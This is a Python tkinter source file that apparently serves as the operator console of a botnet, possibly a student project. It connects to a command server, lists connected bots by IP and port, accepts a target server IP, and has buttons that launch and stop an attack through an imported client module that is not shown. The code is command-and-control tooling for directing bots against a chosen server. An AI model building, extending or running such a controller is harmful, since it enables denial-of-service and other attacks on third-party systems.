import tkinter as tk
import time
import socket

master_client = __import__('master-client')

window = tk.Tk()
window.botcounter = 0


connected = False
running = True
lighton = False
botlist = []

frame_a = tk.Frame()

frame_b = tk.Frame(width=80)

frame_c = tk.Frame(master=window, width=400, height=400, bg="blue")
frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)

#button commands
def upload():
    target = Targetip.get()
    if connected == True:
        send.targetip = target
        send.changeip()
    print(target)

def connect():
    ip = IRCip.get()
    global client
    client = master_client.Client(ip, 9090, 'master')
    client.start()
    global connected
    time.sleep(1)
    connected = client.authenticated
    if connected == True:
        lightupdate.set(1)
        global send
        send = master_client.Send(client.sock)
        global receive
        receive = master_client.Receive(client.sock, client.type, client)
        global botlist
        botlist = client.botlist


    print(ip)

def quit():
    if connected == True:
        send.disconnect()

    global running
    running = False
    window.destroy()

def disconnect():
    if connected == True:
        send.disconnect()

def launchattack():
    if connected == True:
        send.attktype = 1
        send.changeattk()
        time.sleep(1)
        send.startattk()

def stopattack():
    if connected == True:
        send.stopattk()


#==================================================================================
#Button Creation
for i in range(2):

    frame_c.rowconfigure(i, weight=1, minsize=200)

    for j in range(3):
        frame_c.columnconfigure(j, weight=1, minsize=200)

        frame = tk.Frame(
            master=frame_c,
            relief=tk.RAISED,
            borderwidth=3
        )
        if i == 0:

            frame.grid(row=i, column=j)

            if j == 0:
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="IRC Server IP")
                button = tk.Button(master=frame, text="Connect", command=connect)
                IRCip = tk.Entry(master=frame)
                label.pack()
                IRCip.pack()
                button.pack()
                button = tk.Button(master=frame, text="Disconnect", command=disconnect)
                button.pack()
            elif j == 1:
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="Target Server IP")
                Targetip = tk.Entry(master=frame)
                label.pack()
                Targetip.pack()
                button = tk.Button(master=frame, command=upload, text="Upload")
                button.pack()
            elif j == 2:
                frame.config(bg="blue", borderwidth=0, highlightthickness=0)
                light = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=30, height=30)
                coordinates = 2, 2, 29, 29
                circle = light.create_oval(coordinates, fill="red", width=2)
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="IRC Connection Status")
                label.pack(side=tk.LEFT)
                light.pack(padx=2, side=tk.RIGHT)

        elif i == 1 and j == 0:
            frame.grid(row=i, column=j)
            frame.config(highlightthickness=0, bg="blue", borderwidth=0)
            launchimg = tk.PhotoImage(file="Art/cpscart2.png")
            button = tk.Button(master=frame, bg="blue", highlightthickness=0, image=launchimg, borderwidth=0, command=launchattack)
            button.pack(padx=5, pady=5)
        elif j == 1:
            frame.grid(row=i, column=j)
            frame.config(highlightthicknes=0, bg="blue", borderwidth=0)
            stopimg = tk.PhotoImage(file="Art/cpscart3.png")
            button = tk.Button(master=frame, image=stopimg, bg="blue", highlightthickness=0, borderwidth=0, command=stopattack)
            button.pack()
        elif j == 2:
            frame.grid(row=i, column=j)
            frame.config(highlightthickness=0, borderwidth=0, bg="blue")
            img = tk.PhotoImage(file="Art/cpscArt.png")
            pic = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=200, height=200)
            pic.pack()
            pic.create_image(30, 2, anchor=tk.NW, image=img)

scroll = tk.Scrollbar(master=frame_b)
scroll.pack(side=tk.RIGHT, fill=tk.Y)
canvas = tk.Canvas(master=frame_b, width=100)
bots = tk.Frame(master=canvas)
scroll.config(command=canvas.yview)

bots.bind(
    "<Configure>",
    lambda e: canvas.configure(
        scrollregion=canvas.bbox("all")
    ),
)
canvas.create_window((0, 0), window=bots, anchor="nw")
canvas.pack(fill=tk.Y, expand=True)
buttonQ = tk.Button(master=frame_b, text="Quit", width=10, bg="red", command=quit)
buttonQ.pack(side=tk.BOTTOM)
#==================================================================================

#event handlers
def handle_keypress(event):
    window.botcounter += 1
    label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
                      text=f"BOT {window.botcounter}\nIP: 111.1.111.111\nPort: 25565\nJoined: 00.00")
    label1.pack(padx=5, pady=5)


def handle_bots(*args):
    list = bots.pack_slaves()
    for i in list:
        i.destroy()
    for i in botlist:
        j = i.split(";")
        label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
                          text=f"BOT {i}\nIP: {j[1]}\nPort: {j[2]}\nJoined: {j[0]}")
        label1.pack(padx=5, pady=5)


botupdate = tk.IntVar()
botupdate.trace("w", handle_bots)

#for bot testing, to be removed later
def vartest(event):
    botupdate.set(1)

#light-switch handler
def handle_light(*args):
    light.create_oval(coordinates, fill="green", width=2)

#binding widget functions
lightupdate = tk.IntVar()
lightupdate.trace("w", handle_light)

window.bind("<Key a>", handle_keypress)
window.bind("<Key b>", vartest)

label_a = tk.Label(master=frame_a, relief=tk.RAISED, borderwidth=5, text="Connected Bots")
label_a.pack(padx=5)

#packing frames
frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
frame_a.pack()
frame_b.pack(fill=tk.Y, expand=True)


#replacement of window.mainloop()
while running == True:
    if connected == True:
        if lighton == False:
            handle_light
            lighton = True
        #oldlist = botlist
        send.listbot()
        time.sleep(10)
        botlist = client.botlist
        print(botlist)
        #time.sleep(10)
        #if botlist != oldlist:
            #botupdate.set(1)
        botupdate.set(1)
    window.update_idletasks()
    window.update()
    time.sleep(0.01)
